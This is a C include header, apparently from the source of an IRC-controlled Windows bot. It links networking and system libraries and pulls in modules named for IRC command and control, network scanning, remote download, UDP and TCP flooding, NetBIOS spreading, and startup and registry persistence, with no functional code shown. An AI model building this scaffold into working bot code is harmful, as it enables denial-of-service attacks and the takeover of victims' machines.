#define _WIN32_WINNT	0x0403

#define WIN32_LEAN_AND_MEAN

#pragma comment(linker,"/RELEASE")
#pragma comment(linker, "/ALIGN:4096")
#pragma comment(linker, "/IGNORE:4108 ")
#pragma pack(16)

#pragma comment(lib, "delayimp.lib")
#pragma comment(lib, "advapi32.lib")
 



#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Iphlpapi.lib")

#pragma comment(lib, "wininet.lib")

#include <winsock2.h>

#include <ws2tcpip.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <tlhelp32.h>


#include <io.h>

#include <wininet.h>


#include <Iptypes.h>
#include <Iphlpapi.h>




/////////////////////////

#include "defines.h"

/////////////////////////

#ifndef NO_NETBIOS
#include <lm.h>
#include <lmat.h>
#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "Mpr.lib")

#endif

//#ifdef MEM_STATUS

#pragma comment(lib, "psapi.lib")

#include <psapi.h>

//#endif

#include "functions.h"

#include "threads.h"


#include "XIRCStartup.h"

#include "XIRCNick.h"

#include "XIRCParse.h"

#include "XIRCReply.h"

#include "XIRCConnect.h"

#include "XIRCCommands.h"



#include "XAdvScan.h"

#include "XDownload.h"

#include "system.h"

#include "wildcard.h"

#include "XUDPFloodThread.h"
#include "XTCPFloodThread.h"

#include "network.h"

#include "misc.h"
#include "services.h"

#include "startup.h"
#include "installer.h"
#include "registry.h"

